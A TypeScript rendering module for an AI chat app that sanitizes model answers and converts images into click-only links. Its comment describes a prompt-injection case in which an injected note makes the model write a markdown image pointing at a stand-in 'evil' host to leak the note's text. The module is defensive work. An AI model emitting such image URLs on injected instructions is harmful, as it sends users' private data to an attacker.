import { marked } from "marked";
import { escapeHtml, sanitizeHtml } from "../sanitize";

/**
 * Images in a model's answer never load: a prompt-injected note could make the model write
 * ![x](https://evil/?d=<note text>) and the image request alone would leak it. Each <img> becomes a
 * plain link (alt text → its URL), which only goes anywhere if the user clicks it.
 */
function imagesToLinks(html: string): string {
  if (!html.includes("<img")) return html;
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
  for (const img of [...doc.querySelectorAll("img")]) {
    const src = img.getAttribute("src") ?? "";
    const label = `🖼 ${img.getAttribute("alt") || "image"}`;
    if (/^https?:/i.test(src)) {
      const a = doc.createElement("a");
      a.setAttribute("href", src);
      a.textContent = label;
      img.replaceWith(a);
    } else {
      img.replaceWith(doc.createTextNode(label));
    }
  }
  return doc.body.innerHTML;
}

/** AI chat answer → safe HTML. [[Title]] becomes a clickable link; model output is untrusted. */
export function renderAnswer(md: string): string {
  const withLinks = md.replace(
    /\[\[([^\]]+)\]\]/g,
    (_, t: string) => `<a class="ai-link" data-title="${escapeHtml(t)}">${escapeHtml(t)}</a>`,
  );
  return imagesToLinks(sanitizeHtml(marked.parse(withLinks, { async: false }) as string));
}
